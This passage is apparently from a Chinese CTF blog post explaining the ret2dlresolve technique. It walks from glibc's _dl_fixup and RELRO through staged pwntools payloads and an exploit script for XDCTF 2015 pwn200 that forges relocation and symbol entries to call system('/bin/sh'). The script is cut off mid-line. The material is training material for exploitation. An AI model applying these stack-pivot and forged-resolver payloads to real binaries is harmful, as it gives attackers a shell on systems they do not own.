DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);<span class="hljs-comment">//写入GOT</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="基本的利用方法"><a href="#基本的利用方法" class="headerlink" title="基本的利用方法"></a>基本的利用方法</h2><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><ul><li>Partial RELRO：包括<code>.dynamic</code>段在内的一些段被标记为只读</li><li>Full RELRO：在Partial RELRO的基础上，禁用延迟绑定，即所有导入的符号在加载时就被解析，<code>.got.plt</code>段被完全初始化为目标函数的地址，并标记为只读</li></ul><h3 id="关闭RELRO保护"><a href="#关闭RELRO保护" class="headerlink" title="关闭RELRO保护"></a>关闭RELRO保护</h3><p>此时<code>.dynamic</code>段可写，由于装载器是从<code>.dynamic</code>段的<code>DT_STRTAB</code>条目中来获取<code>.dynstr</code>段的地址，而<code>DT_STRTAB</code>的位置是已知的，所以我们可以修改其中的内容，可以将其指向<code>.bss</code>我们构造的假的字符串表，如下图所示：</p><p><img src="/ret2dlresolve/NO_RELRO.png" alt="NO_RELRO"></p><p>在这里我们是不可以直接写<code>.dynstr</code>段的，因为<code>.dynstr</code>是不可写的。</p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>此时，<code>.dynamic</code>段不可写，我们知道加载器是通过第二个参数来求得对应函数的<code>Elf_Rel</code>，然而，如果这个获取的这个内存地址超出了<code>.ret.plt</code>段到达了<code>.bss</code>段上，那我们就可以伪造一个<code>Eif_Rel</code>，使<code>r_offset</code>的值是一个可写的内存地址来将解析后的函数地址写在那里，使<code>r_info</code>的值是一个能够将动态装载器导向到攻击者控制内存的下标，指向一个位于它后面的<code>Elf_Sym</code>，而<code>Elf_Sym</code>中的<code>st_name</code>指向其后面的字符串，如下图所示：</p><p><img src="/ret2dlresolve/Partial_RELRO.png" alt="Partial RELRO"></p><h2 id="例题-x86"><a href="#例题-x86" class="headerlink" title="例题(x86)"></a>例题(x86)</h2><h3 id="XDCTF-2015：pwn200"><a href="#XDCTF-2015：pwn200" class="headerlink" title="XDCTF 2015：pwn200"></a>XDCTF 2015：pwn200</h3><h4 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h4><p><img src="/ret2dlresolve/checksec.png" alt="checksec"></p><p><img src="/ret2dlresolve/main.png" alt="main"></p><p><img src="/ret2dlresolve/vuln.png" alt="vuln"></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>程序启用了<code>Partial RELRO</code>，我们可以采用第二种方法进行攻击，首先我们通过read将栈迁移到<code>.bss</code>上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload_1 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x6c</span> + <span class="hljs-number">4</span>)<br>payload_1 += p32(read_plt)<br>payload_1 += p32(pop3_ret)<br>payload_1 += p32(<span class="hljs-number">0</span>) + p32(bss_addr) + p32(<span class="hljs-number">100</span>)<br>payload_1 += p32(pop_ebp_ret)<br>payload_1 += p32(bss_addr)<br>payload_1 += p32(lea_ret)<br>sh.recv()<br>sh.send(payload_1)<br></code></pre></td></tr></table></figure><p>接下来，我将把<code>write(1, &quot;/bin/sh&quot;, 7)</code>这个函数调用逐步转化为<code>ret2dl-resolve</code>的payload，即最终实现<code>system(&quot;/bin/sh&quot;)</code></p><h5 id="STEP-1"><a href="#STEP-1" class="headerlink" title="STEP 1"></a>STEP 1</h5><p>模拟<code>write@plt</code>执行的效果，即将<code>reloc_index</code>和<code>link_map</code>压栈，然后调用<code>_dl_runtime_resolve</code>函数，我们可以在IDA里面看到<code>write</code>的<code>reloc_index</code>：</p><p><img src="/ret2dlresolve/plt.png" alt="plt"></p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">reloc_index = <span class="hljs-number">0x20</span><br>payload_2 = <span class="hljs-string">&quot;aaaa&quot;</span>      <span class="hljs-comment"># new ebp</span><br>payload_2 += p32(plt_0)      <span class="hljs-comment"># jump to PLT0</span><br>payload_2 += p32(reloc_index)        <span class="hljs-comment"># push 0x20</span><br>payload_2 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_2 += p32(<span class="hljs-number">1</span>) + p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload_2 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_2))<br>payload_2 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_2 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_2))<br>sh.send(payload_2)<br></code></pre></td></tr></table></figure><p>这里我们要注意压栈的过程，当执行到<code>plt_0</code>的时候，我们的<code>esp</code>是指向<code>reloc_index</code>的，然后进行<code>push</code>操作（<strong>将<code>esp</code>减去4个字节，然后将<code>link_map</code>放在<code>esp</code>所在的位置，即payload中<code>plt_0</code>的位置</strong>），然后调用<code>_dl_runtime_resolve</code>函数。</p><h5 id="STEP-2"><a href="#STEP-2" class="headerlink" title="STEP 2"></a>STEP 2</h5><p>在<code>.bss</code>上伪造一个<code>Elf_Rel</code>，<code>r_offset</code>设置为<code>write@plt</code>，<code>r_info</code>设置为<code>0x607</code>，动态加载器通过这个值找到<code>Elf_Sym</code>，但是我们需要调整<code>reloc_index</code>，因为我们需要通过这个值找到在<code>.bss</code>上伪造的<code>Elf_Sym</code>。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_info = <span class="hljs-number">0x607</span><br>fake_reloc = p32(write_got) + p32(r_info)<br>payload_3 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_3 += p32(plt_0)<br>payload_3 += p32(reloc_index)<br>payload_3 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_3 += p32(<span class="hljs-number">1</span>) + p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload_3 += fake_reloc         <span class="hljs-comment"># bss_addr + 28</span><br>payload_3 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_3))<br>payload_3 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_3 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_3))<br>sh.send(payload_3)<br></code></pre></td></tr></table></figure><h5 id="STEP-3"><a href="#STEP-3" class="headerlink" title="STEP 3"></a>STEP 3</h5><p>在<code>.bss</code>上构造<code>Elf_Sym</code>，我们需要构造<code>Elf_Sym</code>里面的内容，提供两种方法：</p><ul><li><p>在IDA里面我们可以看到相应的结构体</p><p><img src="/ret2dlresolve/write_sym.png" alt="write_sym"></p></li><li><p>使用<code>objdump</code>工具</p><p><img src="/ret2dlresolve/objdump.png" alt="objdump"></p></li></ul><p>同时，我们也需要改变<code>r_info</code>的值，因为动态加载器会通过这个值找到我们在<code>.bss</code>上构造的<code>Elf_Sym</code>，<code>r_info</code>由<code>r_sym</code>和<code>r_type</code>来组成，<code>r_sym</code>是<code>Elf_Sym</code>相对于<code>.dynsym</code>的下标偏移，<code>r_type</code>设置为<code>0x7</code>就可以了，我们可以通过宏定义来找到<code>r_info</code>的计算方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* How to extract and insert information held in the r_info field.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_SYM(val)((val) &gt;&gt; 8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_TYPE(val)((val) &amp; 0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_INFO(sym, type)(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_SYM(i)((i) &gt;&gt; 32)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_TYPE(i)((i) &amp; 0xffffffff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_INFO(sym,type)((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span><br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_sym = (bss_addr + <span class="hljs-number">36</span> - dynsym) / <span class="hljs-number">0x10</span><br>r_type = <span class="hljs-number">0x7</span><br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + (r_type &amp; <span class="hljs-number">0xff</span>)<br>fake_reloc = p32(write_got) + p32(r_info)<br>fake_sym = p32(<span class="hljs-number">0x4c</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x12</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_4 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_4 += p32(plt_0)<br>payload_4 += p32(reloc_index)<br>payload_4 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_4 += p32(<span class="hljs-number">1</span>) + p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload_4 += fake_reloc<br>payload_4 += fake_sym           <span class="hljs-comment"># bss_addr + 36</span><br>payload_4 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_4))<br>payload_4 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_4 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_4))<br>sh.send(payload_4)<br></code></pre></td></tr></table></figure><p><strong>这里需要注意的是，<code>r_sym</code>是<code>.dynsym</code>的索引，所以需要除以<code>Elf_Sym</code>结构体的大小，在这里是0x10，并且在之后我们要进行位操作，所以要保证这个除出来的结果是一个整数。</strong></p><h5 id="STEP-4"><a href="#STEP-4" class="headerlink" title="STEP 4"></a>STEP 4</h5><p>在<code>.bss</code>段上伪造<code>.dynstr</code>，也就是放上<code>&#39;write&#39;</code>字符串，相应的我们需要控制<code>fake_Sym</code>的<code>st_name</code>指向伪造的字符串，同时，可以根据宏定义，通过<code>st_bind</code>和<code>st_type</code>的值来计算<code>st_info</code>。</p><p>相关宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* How to extract and insert information held in the st_info field.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_BIND(val)(((unsigned char) (val)) &gt;&gt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_TYPE(val)((val) &amp; 0xf)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_INFO(bind, type)(((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span><br><br><span class="hljs-comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_BIND(val)ELF32_ST_BIND (val)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_TYPE(val)ELF32_ST_TYPE (val)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_INFO(bind, type)ELF32_ST_INFO ((bind), (type))</span><br></code></pre></td></tr></table></figure><p>可以参照这幅图：</p><p><img src="/ret2dlresolve/st_info.png" alt="st_info"></p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_sym = (bss_addr + <span class="hljs-number">36</span> - dynsym) / <span class="hljs-number">0x10</span><br>r_type = <span class="hljs-number">0x7</span><br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + (r_type &amp; <span class="hljs-number">0xff</span>)<br>fake_reloc = p32(write_got) + p32(r_info)<br>st_name = bss_addr + <span class="hljs-number">60</span> - dynstr<br>st_bind = <span class="hljs-number">0x1</span><br>st_type = <span class="hljs-number">0x2</span><br>st_info = (st_bind &lt;&lt; <span class="hljs-number">4</span>) + (st_type &amp; <span class="hljs-number">0xf</span>)<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(st_info) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_5 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_5 += p32(plt_0)<br>payload_5 += p32(reloc_index)<br>payload_5 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_5 += p32(<span class="hljs-number">1</span>) + p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload_5 += fake_reloc<br>payload_5 += fake_sym<br>payload_5 += <span class="hljs-string">&quot;write\x00&quot;</span>            <span class="hljs-comment"># bss + 60     </span><br>payload_5 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_5))<br>payload_5 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_5 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_5))<br>sh.send(payload_5)<br></code></pre></td></tr></table></figure><h5 id="STEP-5"><a href="#STEP-5" class="headerlink" title="STEP 5"></a>STEP 5</h5><p>最后将字符串<code>&#39;write&#39;</code>改成<code>&#39;system&#39;</code>，并调整一下参数就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_sym = (bss_addr + <span class="hljs-number">36</span> - dynsym) / <span class="hljs-number">0x10</span><br>r_type = <span class="hljs-number">0x7</span><br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + (r_type &amp; <span class="hljs-number">0xff</span>)<br>fake_reloc = p32(write_got) + p32(r_info)<br>st_name = bss_addr + <span class="hljs-number">60</span> - dynstr<br>st_bind = <span class="hljs-number">0x1</span><br>st_type = <span class="hljs-number">0x2</span><br>st_info = (st_bind &lt;&lt; <span class="hljs-number">4</span>) + (st_type &amp; <span class="hljs-number">0xf</span>)<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(st_info) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_6 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_6 += p32(plt_0)<br>payload_6 += p32(reloc_index)<br>payload_6 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_6 += p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_6 += fake_reloc<br>payload_6 += fake_sym<br>payload_6 += <span class="hljs-string">&quot;system\x00&quot;</span>          <br>payload_6 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_6))<br>payload_6 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_6 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_6))<br>sh.send(payload_6)<br></code></pre></td></tr></table></figure><h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./bof&quot;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node4.buuoj.cn&quot;, 29188)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./bof&quot;</span>)<br><br>pop3_ret = <span class="hljs-number">0x08048629</span><br>pop_ebp_ret = <span class="hljs-number">0x0804862b</span><br>lea_ret = <span class="hljs-number">0x08048445</span><br>bss_addr = <span class="hljs-number">0x0804A028</span> + <span class="hljs-number">0x500</span><br><br>plt_0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload_1 = <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">0x6c</span> + <span class="hljs-number">4</span>)<br>payload_1 += p32(read_plt)<br>payload_1 += p32(pop3_ret)<br>payload_1 += p32(<span class="hljs-number">0</span>) + p32(bss_addr) + p32(<span class="hljs-number">100</span>)<br>payload_1 += p32(pop_ebp_ret)<br>payload_1 += p32(bss_addr)<br>payload_1 += p32(lea_ret)<br>sh.recv()<br>sh.send(payload_1)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">reloc_index = 0x20</span><br><span class="hljs-string">payload_2 = &quot;aaaa&quot;      # new ebp</span><br><span class="hljs-string">payload_2 += p32(plt_0)      # jump to PLT0</span><br><span class="hljs-string">payload_2 += p32(reloc_index)        # push 0x20</span><br><span class="hljs-string">payload_2 += &quot;aaaa&quot;</span><br><span class="hljs-string">payload_2 += p32(1) + p32(bss_addr + 80) + p32(len(&quot;/bin/sh&quot;))</span><br><span class="hljs-string">payload_2 += &quot;a&quot; * (80 - len(payload_2))</span><br><span class="hljs-string">payload_2 += &quot;/bin/sh\x00&quot;</span><br><span class="hljs-string">payload_2 += &quot;a&quot; * (100 - len(payload_2))</span><br><span class="hljs-string">sh.send(payload_2)</span><br><span class="hljs-string">sh.recv()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">reloc_index = bss_addr + 28 - rel_plt</span><br><span class="hljs-string">r_info = 0x607</span><br><span class="hljs-string">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="hljs-string">payload_3 = &quot;aaaa&quot;</span><br><span class="hljs-string">payload_3 += p32(plt_0)</span><br><span class="hljs-string">payload_3 += p32(reloc_index)</span><br><span class="hljs-string">payload_3 += &quot;aaaa&quot;</span><br><span class="hljs-string">payload_3 += p32(1) + p32(bss_addr + 80) + p32(len(&quot;/bin/sh&quot;))</span><br><span class="hljs-string">payload_3 += fake_reloc         # bss_addr + 28</span><br><span class="hljs-string">payload_3 += &quot;a&quot; * (80 - len(payload_3))</span><br><span class="hljs-string">payload_3 += &quot;/bin/sh\x00&quot;</span><br><span class="hljs-string">payload_3 += &quot;a&quot; * (100 - len(payload_3))</span><br><span class="hljs-string">sh.send(payload_3)</span><br><span class="hljs-string">sh.recv()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">reloc_index = bss_addr + 28 - rel_plt</span><br><span class="hljs-string">r_sym = (bss_addr + 36 - dynsym) / 0x10</span><br><span class="hljs-string">r_type = 0x7</span><br><span class="hljs-string">r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff)</span><br><span class="hljs-string">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="hljs-string">fake_sym = p32(0x4c) + p32(0) + p32(0) + p32(0x12) + p32(0) + p32(0)</span><br><span class="hljs-string">payload_4 = &quot;aaaa&quot;</span><br><span class="hljs-string">payload_4 += p32(plt_0)</span><br><span class="hljs-string">payload_4 += p32(reloc_index)</span><br><span class="hljs-string">payload_4 += &quot;aaaa&quot;</span><br><span class="hljs-string">payload_4 += p32(1) + p32(bss_addr + 80) + p32(len(&quot;/bin/sh&quot;))</span><br><span class="hljs-string">payload_4 += fake_reloc</span><br><span class="hljs-string">payload_4 += fake_sym           # bss_addr + 36</span><br><span class="hljs-string">payload_4 += &quot;a&quot; * (80 - len(payload_4))</span><br><span class="hljs-string">payload_4 += &quot;/bin/sh\x00&quot;</span><br><span class="hljs-string">payload_4 += &quot;a&quot; * (100 - len(payload_4))</span><br><span class="hljs-string">sh.send(payload_4)</span><br><span class="hljs-string">sh.recv()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">reloc_index = bss_addr + 28 - rel_plt</span><br><span class="hljs-string">r_sym = (bss_addr + 36 - dynsym) / 0x10</span><br><span class="hljs-string">r_type = 0x7</span><br><span class="hljs-string">r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff)</span><br><span class="hljs-string">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="hljs-string">st_name = bss_addr + 60 - dynstr</span><br><span class="hljs-string">st_bind = 0x1</span><br><span class="hljs-string">st_type = 0x2</span><br><span class="hljs-string">st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)</span><br><span class="hljs-string">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info) + p32(0) + p32(0)</span><br><span class="hljs-string">payload_5 = &quot;aaaa&quot;</span><br><span class="hljs-string">payload_5 += p32(plt_0)</span><br><span class="hljs-string">payload_5 += p32(reloc_index)</span><br><span class="hljs-string">payload_5 += &quot;aaaa&quot;</span><br><span class="hljs-string">payload_5 += p32(1) + p32(bss_addr + 80) + p32(len(&quot;/bin/sh&quot;))</span><br><span class="hljs-string">payload_5 += fake_reloc</span><br><span class="hljs-string">payload_5 += fake_sym</span><br><span class="hljs-string">payload_5 += &quot;write\x00&quot;            # bss + 60     </span><br><span class="hljs-string">payload_5 += &quot;a&quot; * (80 - len(payload_5))</span><br><span class="hljs-string">payload_5 += &quot;/bin/sh\x00&quot;</span><br><span class="hljs-string">payload_5 += &quot;a&quot; * (100 - len(payload_5))</span><br><span class="hljs-string">sh.send(payload_5)</span><br><span class="hljs-string">sh.recv()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_sym = (bss_addr + <span class="hljs-number">36</span> - dynsym) / <span class="hljs-number">0x10</span><br>r_type = <span class="hljs-number">0x7</span><br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + (r_type &amp; <span class="hljs-number">0xff</span>)<br>fake_reloc = p32(write_got) + p32(r_info)<br>st_name = bss_addr + <span class="hljs-number">60</span> - 